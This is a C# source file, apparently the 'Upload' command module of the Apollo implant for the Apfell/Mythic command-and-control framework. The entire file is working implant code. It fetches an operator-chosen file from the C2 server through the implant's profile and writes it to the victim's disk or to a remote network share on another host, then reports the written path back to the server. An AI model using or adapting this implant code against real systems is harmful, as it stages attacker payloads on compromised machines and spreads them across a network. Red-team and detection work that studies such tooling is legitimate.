#define COMMAND_NAME_UPPER

#if DEBUG
#undef UPLOAD
#define UPLOAD
#endif

#if UPLOAD
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.IO;
using Apollo.Jobs;
using Apollo.Tasks;
using System.Linq;

/// <summary>
/// This task will upload a specified file from the Apfell server to the implant at the given file path
/// </summary>
namespace Apollo.CommandModules
{
    public struct UploadParameters
    {
        public string file;
        public string file_name;
        public string remote_path;
        public string host;
    }
    public class Upload
    {

        /// <summary>
        /// Write a file to disk.
        /// </summary>
        /// <param name="job">Job associated with this task. task.@params will hold a JSON dict containing file_id and remote_path</param>
        /// <param name="implant">Agent associated with this task.</param>
        public static void Execute(Job job, Agent implant)
        {
            byte[] contents;
            Task task = job.Task;
            UploadParameters parameters = JsonConvert.DeserializeObject<UploadParameters>(task.parameters);
            string filepath;
            if (!string.IsNullOrEmpty(parameters.host) && !string.IsNullOrEmpty(parameters.remote_path))
            {
                parameters.remote_path = $"\\\\{parameters.host}\\{parameters.remote_path}";
            }
            if (string.IsNullOrEmpty(parameters.remote_path))
            {
                filepath = Path.Combine(Directory.GetCurrentDirectory(), parameters.file_name);
            } else if (Directory.Exists(parameters.remote_path))
            {
                filepath = Path.Combine(parameters.remote_path, parameters.file_name);
            } else if (!string.IsNullOrEmpty(Path.GetDirectoryName(parameters.remote_path)) && Directory.Exists(Path.GetDirectoryName(parameters.remote_path)))
            {
                filepath = parameters.remote_path;
            } else if (File.Exists(parameters.remote_path))
            {
                job.SetError($"File {parameters.remote_path} already exists on disk. Please move or delete the specified file before overwriting.");
                return;
            }
            else if (!string.IsNullOrEmpty(parameters.remote_path) && !parameters.remote_path.Contains("\\"))
            {
                filepath = $".\\{parameters.remote_path}";
            } 
            else
            {
                job.SetError($"Could not find a location on disk that matches the remote path given: {parameters.remote_path}");
                return;
            }

            if (string.IsNullOrEmpty(parameters.file))
            {
                job.SetError("No file was given to upload.");
                return;
            }

            
            
            // First we have to request the file from the server with a POST
            try // Try block for HTTP request
            {
                contents = implant.Profile.GetFile(job.Task.id, parameters.file, implant.Profile.ChunkSize);
                if (contents == null || contents.Length == 0)
                {
                    job.SetError($"Retrieved file {parameters.file_name} (ID: {parameters.file}), but it was zero length. Aborting upload.");
                    return;
                }
                // Write file to disk
                File.WriteAllBytes(filepath, contents);
                FileInfo finfo = new FileInfo(filepath);
                ApolloTaskResponse resp = new ApolloTaskResponse(task, $"Wrote {contents.Length} bytes to {filepath}")
                {
                    full_path = finfo.FullName,
                    completed = true,
                    file_id = parameters.file
                };
                //resp.user_output = $"Wrote {contents.Length} bytes to {filepath}";
                job.SetComplete(resp);
                
            }
            catch (Exception ex) // Catch exceptions from HTTP request
            {
                // Something failed, so we need to tell the server about it
                job.SetError($"Error writing file to disk. Reason: {ex.Message}");
            }
        }
    }
}
#endif